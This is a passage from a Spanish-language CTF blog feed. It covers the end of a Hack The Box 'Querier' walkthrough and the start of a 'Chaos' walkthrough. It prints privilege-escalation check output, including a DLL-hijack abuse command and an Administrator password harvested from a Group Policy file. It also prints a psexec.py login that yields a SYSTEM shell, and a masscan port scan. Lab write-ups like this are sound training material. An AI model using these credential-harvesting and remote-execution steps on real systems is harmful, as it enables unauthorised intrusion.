&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquoted&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;executable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argument&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;permissions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;permissions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;potentially&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hijackable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DLL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;locations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;ModifiablePath&lt;/span&gt;    &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mssql-svc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsApps&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;IdentityReference&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;QUERIER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mssql-svc&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Permissions&lt;/span&gt;       &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteOwner&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Delete&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WriteAttributes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Synchronize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;%&lt;/span&gt;            &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mssql-svc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsApps&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;AbuseFunction&lt;/span&gt;     &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Write-HijackDll&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-DllPath&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&amp;#39;&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AlwaysInstallElevated&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;registry&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Autologon&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;credentials&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;registry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;modifidable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;registry&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;autoruns&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;modifiable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;schtask&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unattended&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;UnattendPath&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Panther&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Unattend&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encrypted&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;web&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encrypted&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;application&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pool&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;virtual&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwords&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwords&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;McAfee&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SiteList&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;....&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cached&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Group &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Policy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Preferences&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;....&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;Changed&lt;/span&gt;   &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2019&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;01&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;28&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;UserNames&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;NewName&lt;/span&gt;   &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[BLANK]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Passwords&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MyUnclesAreMarioAndLuigi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;!!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;!}&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;File&lt;/span&gt;      &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProgramData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Group &lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;Policy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;History&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;31B2F340&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;016D&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;11D2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;945F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;00C04FB984F9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Machine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Preferences&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Groups&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Groups&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al finalizar Nos encontramos que existe un archivo de &lt;code&gt;Groups Policy&lt;/code&gt; que contiene un Usuario y Contraseña, en este caso el de Administrator. Utilizando el script &lt;code&gt;psexec.py&lt;/code&gt; para conectarnos de manera remota con el Usuario Administrator y obtener una shell con &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python psexec.py -debug Administrator:&lt;span class=&#34;s1&#34;&gt;&amp;#39;MyUnclesAreMarioAndLuigi!!1!&amp;#39;&lt;/span&gt;@10.10.10.125

root@sckull:~/impacket/examples# python psexec.py -debug Administrator:&lt;span class=&#34;s1&#34;&gt;&amp;#39;MyUnclesAreMarioAndLuigi!!1!&amp;#39;&lt;/span&gt;@10.10.10.125
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; StringBinding ncacn_np:10.10.10.125&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;ipe&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vcctl&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Your pycrypto doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Download it from https://www.dlitz.net/software/pycrypto
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Requesting shares on 10.10.10.125.....
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Found writable share ADMIN$
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Uploading file WsaCFcep.exe
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Opening SVCManager on 10.10.10.125.....
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Creating service EOzc on 10.10.10.125.....
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Starting service EOzc.....
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Your pycrypto doesn&amp;#39;&lt;/span&gt;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
Download it from https://www.dlitz.net/software/pycrypto
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Press &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; extra shell commands
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Your pycrypto doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Download it from https://www.dlitz.net/software/pycrypto
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Your pycrypto doesn&amp;#39;&lt;/span&gt;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
Download it from https://www.dlitz.net/software/pycrypto
Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.17763.292&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; Microsoft Corporation. All rights reserved.

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;cd ..

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&amp;gt;cd C:&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;
C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Users&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&amp;gt;cd Desktop

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;dir
 Volume in drive C has no label.
 Volume Serial Number is FE98-F373

 Directory of C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop

01/29/2019  12:04 AM    &amp;lt;DIR&amp;gt;          .
01/29/2019  12:04 AM    &amp;lt;DIR&amp;gt;          ..
01/28/2019  12:08 AM                &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; root.txt
               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; File&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; bytes
               &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; Dir&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   5,970,571,264 bytes free

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;more root.txt
b19c3794f786a1fdcf205f81497c3592
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/querier/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/querier/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Chaos</title>
        <link>https://sckull.github.io/posts/chaos/</link>
        <pubDate>Sat, 25 May 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 25 May 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/chaos/</guid>
        <description>Chaos es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Chaos es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;br&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos udp/tcp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~# masscan -p1-65535,U:1-65535 10.10.10.120 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 10000/tcp on 10.10.10.120                                 
Discovered open port 10000/udp on 10.10.10.120                                 
Discovered open port 110/tcp on 10.10.10.120                                   
Discovered open port 143/tcp on 10.10.10.120                                   
Discovered open port 995/tcp on 10.10.10.120                                   
Discovered open port 993/tcp on 10.10.10.120
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
